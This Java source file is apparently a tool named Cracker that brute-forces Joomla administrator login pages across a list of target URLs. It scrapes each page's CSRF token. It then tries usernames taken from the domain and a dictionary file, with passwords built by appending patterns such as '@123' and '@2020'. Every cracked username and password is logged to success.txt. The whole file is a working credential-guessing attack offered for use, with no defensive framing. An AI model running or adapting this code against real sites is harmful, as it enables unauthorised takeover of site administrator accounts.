package github.thekingofduck.joomla;

import com.github.kevinsawicki.http.HttpRequest;

import java.io.*;
import java.util.ArrayList;
import java.util.Collections;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Cracker {

    public static ArrayList<String> getUserList(String DictPath,String url) {
        ArrayList<String> userList = new ArrayList<String>();

        Pattern p1 = Pattern.compile("//(.+?)/");
        Matcher m1 = p1.matcher(url);
        String domain = "";
        while(m1.find()) {
            domain = m1.group(1);
        }

        Collections.addAll(userList, domain.split("\\."));

        try {
            File file = new File(DictPath);
            InputStreamReader inputReader = new InputStreamReader(new FileInputStream(file));
            BufferedReader bf = new BufferedReader(inputReader);
            // 按行读取字符串
            String str;
            while ((str = bf.readLine()) != null) {
                userList.add(str);
            }
            bf.close();
            inputReader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        //System.out.println(url);



        return userList;

    }

    public static ArrayList<String> getPassList(String DictPath,ArrayList<String> userList) {
        ArrayList<String> passList = new ArrayList<String>();

        for (String user:userList) {
            passList.add(user + "@123");
            passList.add(user + "_123");
            passList.add(user + "!@123");
            passList.add(user + "!@#");
            passList.add(user + "@2019");
            passList.add(user + "@2020");
        }

        try {
            File file = new File(DictPath);
            InputStreamReader inputReader = new InputStreamReader(new FileInputStream(file));
            BufferedReader bf = new BufferedReader(inputReader);
            // 按行读取字符串
            String str;
            while ((str = bf.readLine()) != null) {
                passList.add(str);
            }
            bf.close();
            inputReader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        //System.out.println(url);

        return passList;

    }

    public static void Crack(String url) throws IOException {

        String returnStr = null;
        String hashStr = null;
        HttpRequest res = HttpRequest.get(url);
        String body = res.body();
        Pattern p1 = Pattern.compile("return\" value=\"(.+?)\"/>");
        Matcher m1 = p1.matcher(body);
        while(m1.find()) {
            returnStr = m1.group(1);
        }
        Pattern p2 = Pattern.compile("<input type=\"hidden\" name=\"(.+?)\" value=\"1\" />");
        Matcher m2 = p2.matcher(body);
        while(m2.find()) {
            hashStr = m2.group(1);
        }

        String Cookie = res.header("Set-Cookie");

        System.out.println(url + "\nToken:\t" +returnStr+ "\t" + hashStr);

        boolean success = false;

        ArrayList<String> userList = getUserList("user.txt",url);

        for (String username:userList) {
            for (String password:getPassList("pass.txt",userList)) {
                //System.out.println(password);
                String loginData = String.format("username=%s&passwd=%s&lang=en-GB&option=com_login&task=login&return=%s&%s=1", username, password,returnStr,hashStr);
                HttpRequest res2 = HttpRequest.post(url).header("Cookie",Cookie).send(loginData).followRedirects(false).readTimeout(5);
                int statCode = res2.code();
                String setCookie = res2.header("Set-Cookie");
                if (statCode==303 && setCookie != null){
                    System.out.println(String.format("%s\t%s\tTrue",username,password));
                    success = true;
                    FileWriter fw = null;
                    try {
                        File f=new File("success.txt");
                        fw = new FileWriter(f, true);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    PrintWriter pw = new PrintWriter(fw);
                    pw.println(String.format("%s\t%s\t%s\t",url,username,password));
                    pw.flush();
                    try {
                        fw.flush();
                        pw.close();
                        fw.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    break;
                }else {
                    System.out.println(String.format("%s\t%s\tFalse",username,password));
                }
            }
            if (success){
                break;
            }
        }
    }

    public static void setProxy(boolean flag) {

        if (flag){
            HttpRequest.proxyHost("127.0.0.1");
            HttpRequest.proxyPort(8080);
        }
    }

    public static void main(String[] args) throws IOException {
        setProxy(true);

        //String url = "http://www.baidu.com/administrator/index.php";

        InputStreamReader read = new InputStreamReader(
                new FileInputStream("urls.txt"),"UTF-8");//考虑到编码格式
        BufferedReader bufferedReader = new BufferedReader(read);
        String lineTxt = null;
        while((lineTxt = bufferedReader.readLine()) != null){
            //System.out.println(lineTxt);
            String url = lineTxt;
            if (HttpRequest.head(url).code()==200){
                try {
                    Crack(url);
                    System.out.println(url);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        read.close();
    }
}
